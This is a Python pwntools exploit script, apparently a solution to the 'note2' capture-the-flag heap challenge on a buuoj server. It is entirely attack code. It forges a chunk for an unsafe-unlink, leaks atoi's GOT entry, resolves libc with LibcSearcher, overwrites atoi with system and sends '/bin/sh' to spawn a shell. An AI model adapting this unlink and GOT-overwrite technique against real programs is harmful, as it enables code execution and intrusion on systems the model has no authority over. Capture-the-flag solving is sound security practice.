
from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './note2'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',29127) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
def add(len,content='a'*8):
    sla('>>','1')
    sla('128)',str(len))
    sla('content:',content)

def show(index):
    sla('>>','2')
    sla('note:',str(index))

def edit(index,choice,content):
    sla('>>','3')
    sla('note:',str(index))
    sla(']',str(choice))
    sl(content)

def delete(index):
    sla('>>','4')
    sla('note:',str(index))

sla('name:','merc')
sla('address:','privacy')

ptr = 0x602120
fd = ptr-0x18
bk = ptr-0x10
payload = flat('a'*8,0x61,fd,bk,'a'*0x40,0x60)
add(0x80,payload) # 0
add(0) # 1,0x20
add(0x80) # 2

delete(1)
# padding,prev_size=0x20+0x80,PREV_IN_USE=0
add(0,flat('a'*0x10,0xa0,0x90))
delete(2)

payload = flat('a'*0x18,elf.got['atoi'])
edit(0,1,payload)
show(0)
ru('is ')
atoi = uu64(r(6))
system,binsh = ret2libc(atoi,'atoi')
edit(0,1,p64(system))
sla('>>','/bin/sh\x00')
# end

itr()